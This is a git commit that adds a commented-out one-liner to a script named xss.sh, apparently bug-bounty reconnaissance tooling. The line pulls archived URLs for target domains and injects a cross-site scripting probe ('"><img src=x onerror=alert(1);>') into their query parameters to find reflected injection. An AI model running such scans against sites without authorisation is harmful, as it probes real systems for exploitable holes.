e93c73e0a1ca85216150a9908049ce28e7edca51
Aravind Menon <53946198+amaravindmenon@users.noreply.github.com>
2022-07-09 18:05:17 +0530

    Update xss.sh

--- xss.sh
+++ xss.sh
@@ -31,3 +31,4 @@ done
 
 
 #cat domainhttpx.txt | waybackurls | grep "=" | egrep =iv".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|icon|pdf|svg|txt|js)" | uro | qsreplace '"><img src=x onerror=alert(1);>" | freq
+#cat domainhttpx.txt | waybackurls | gf xss | uro | qsreplace '"><img src=x onerror=alert(1);>"' | freq
